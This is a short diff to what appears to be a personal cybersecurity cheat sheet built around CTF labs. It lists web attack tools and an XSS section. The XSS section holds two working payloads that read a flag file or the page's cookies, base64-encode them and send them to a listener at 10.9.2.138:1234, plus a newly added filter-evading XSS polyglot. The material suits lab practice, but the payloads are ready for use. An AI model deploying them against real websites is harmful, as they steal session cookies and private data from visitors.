@@ -48,9 +48,11 @@ List of tools/resources for Cybersecurity
   - liffy – LFI to RCE using wrappers, filters, or logs
   - Kiterunner – Advanced wordlist-based directory busting with support for Swagger/OpenAPI
   - tplmap – Server-side template injection tool
+    
 ### XSS
   - ```fetch('/flag.txt').then(res => res.text()).then(data => { fetch('http://10.9.2.138:1234?flag=' + btoa(data));});```
   - ```</textarea><script>fetch('http://10.9.2.138:1234?cookie=' + btoa(document.cookie) );</script>```
+  - ```jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``` -> An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
 
 ### Spiders & Path Traversal
 - Feroxbuster
